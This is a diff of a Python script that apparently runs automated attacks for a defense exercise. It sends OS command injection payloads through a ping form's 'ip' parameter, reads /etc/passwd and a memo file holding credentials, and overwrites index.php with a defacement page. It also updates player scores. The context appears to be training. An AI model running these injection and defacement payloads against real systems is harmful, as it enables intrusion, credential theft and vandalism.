@@ -51,9 +51,8 @@ def check_status_code(player_id, hostname):
 # Function to check if the web app is usable (ping test)
 def check_web_app_usage(player_id, hostname):
     try:
-        url = f"http://{hostname}:{HTTP_PORT}/"
-        data = {'ip': '127.0.0.1'}
-        response = requests.post(url, data=data)
+        url = f"http://{hostname}:{HTTP_PORT}/?ip=127.0.0.1"
+        response = requests.get(url)
         
         if "127.0.0.1 ping statistics" in response.text:
             print(f"Web app on {hostname} is usable, ping successful")
@@ -102,23 +101,34 @@ def ssh_logins():
 
 # Attempts command injection for a given step
 def command_injection_requests():
-    print("Attempting command injection requests with 'id' command...")
+    print("Attempting command injection requests...")
+    
     for index, hostname in enumerate(HOSTNAMES):
         url = f"http://{hostname}:{HTTP_PORT}/"
-        command = 'id'
         
-        data = {'ip': f'; {command}'}
-        try:
-            response = requests.post(url, data=data)
-            print(f"POST {command} to {hostname}, Response Code: {response.status_code}, Output: {response.text}")
-            
-            # Check if the response status is 200 and "www-data" is not in the response
-            if response.status_code == 200 and "www-data" not in response.text:
-                print(f"Command injection failed on {hostname}, 'www-data' not found")
-                send_score_update(index + 1, 50)
-        except Exception as e:
-            print(f"Error with POST {command} to {hostname}: {e}")
-            send_score_update(index + 1, 50)
+        # Define the commands to be executed
+        commands = {
+            'pwd': '/var/www/html',
+            'id': 'www-data',
+            'whoami': 'www-data',
+            'cat /etc/passwd': 'www-data'
+        }
+        
+        for command, expected_output in commands.items():
+            params = {'ip': f'; {command}'}
+            try:
+                response = requests.get(url, params=params)
+                print(f"GET {command} to {hostname}, Response Code: {response.status_code}, Output: {response.text}")
+                
+                # Check if the response status is 200 and the expected output is in the response
+                if response.status_code == 200 and expected_output in response.text:
+                    print(f"Command {command} executed successfully on {hostname}")
+                else:
+                    print(f"Command {command} failed on {hostname}, '{expected_output}' not found")
+                    send_score_update(index + 1, 10)
+
+            except Exception as e:
+                print(f"Error with GET {command} to {hostname}: {e}")
 
 # Additional OS command injection: cat /var/www/html/memo.txt
 def additional_command_injection():
@@ -127,9 +137,9 @@ def additional_command_injection():
         url = f"http://{hostname}:{HTTP_PORT}/"
         command = 'cat /var/www/html/memo.txt'
         
-        data = {'ip': f'; {command}'}
+        params = {'ip': f'; {command}'}
         try:
-            response = requests.post(url, data=data)
+            response = requests.get(url, params=params)
             print(f"POST {command} to {hostname}, Response Code: {response.status_code}, Output: {response.text}")
             
             # Check if "dev:devpass" is in the response
@@ -138,7 +148,6 @@ def additional_command_injection():
                 send_score_update(index + 1, 50)
         except Exception as e:
             print(f"Error with POST {command} to {hostname}: {e}")
-            send_score_update(index + 1, 50)
 
 # Attempts to modify ping-checker page for a given step
 def modify_ping_checker():
@@ -152,22 +161,21 @@ def modify_ping_checker():
                    '</head><body><h1>Hacked by Unknown</h1><p>Your website is compromised.</p>'
                    '<p>Take action immediately!</p></body></html>')
 
-        data = {'ip': f'; echo "{payload}" > /var/www/html/index.php'}
+        params = {'ip': f'; echo "{payload}" > /var/www/html/index.php'}
         
         try:
-            response = requests.post(url, data=data)
+            response = requests.get(url, params=params)
             print(f"POST modify request to {hostname}, Response Code: {response.status_code}")
             # Check if the page was modified
             time.sleep(5)
             modified_page = requests.get(url)
             if response.status_code == 200 and "Hacked by Unknown" not in modified_page.text:
-                print(f"Page modified successfully on {hostname}")
-            else:
                 print(f"Failed to modify page on {hostname}")
                 send_score_update(index + 1, 50)
+            else:
+                print(f"Page modified successfully on {hostname}")
         except Exception as e:
             print(f"Error with POST modify request to {hostname}: {e}")
-            send_score_update(index + 1, 50)
 
 # The attack sequence for all steps
 def attack_sequence():
